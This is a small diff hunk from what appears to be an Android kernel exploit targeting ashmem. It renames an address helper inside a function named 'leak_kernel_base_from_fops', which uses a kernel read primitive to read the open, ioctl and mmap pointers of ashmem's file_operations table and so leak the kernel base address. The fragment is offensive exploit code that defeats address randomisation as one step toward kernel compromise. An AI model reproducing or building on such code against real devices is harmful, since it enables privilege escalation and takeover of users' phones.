@@ -61,7 +61,7 @@ static int refresh_fake_fops_text(int fd) {
 }
 
 static int leak_kernel_base_from_fops(int fd) {
-  uintptr_t fops_alias = p0_data_alias(ASHMEM_FOPS);
+  uintptr_t fops_alias = data_addr(ASHMEM_FOPS);
   uint64_t open_ptr = kernel_read64(fd, fops_alias + FOPS_OPEN_OFF);
   uint64_t ioctl_ptr = kernel_read64(fd, fops_alias + FOPS_IOCTL_OFF);
   uint64_t mmap_ptr = kernel_read64(fd, fops_alias + FOPS_MMAP_OFF);
